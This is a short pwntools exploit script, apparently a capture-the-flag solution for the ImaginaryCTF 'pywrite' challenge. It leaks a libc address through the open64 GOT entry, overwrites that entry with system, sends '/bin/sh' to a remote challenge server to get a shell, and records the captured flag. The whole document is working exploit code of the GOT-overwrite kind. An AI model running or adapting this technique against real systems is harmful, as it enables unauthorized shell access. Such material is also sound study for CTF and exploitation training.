from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./python3')
libc = ELF('./libc.so.6')
print(elf.got['open64'])

# io = process(['./python3', 'vuln.py'])
# io = gdb.debug(['./python3', 'vuln.py'], 'b system\nc')
io = remote("pywrite.chal.imaginaryctf.org", 1337)
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'where? ', str(elf.got['open64']).encode())
libc_base = int(io.recvline()) - libc.sym['open64']
print(f'{libc_base = :#x}')
libc.address = libc_base
system = elf.sym['system']
print(f'{system = :#x}')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'what? ', str(system).encode())
io.sendlineafter(b'where? ', str(elf.got['open64']).encode())

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b'what????? ', b'/bin/sh')
io.interactive()
# ictf{sn3aky_snAk3s_1b99a1f0}
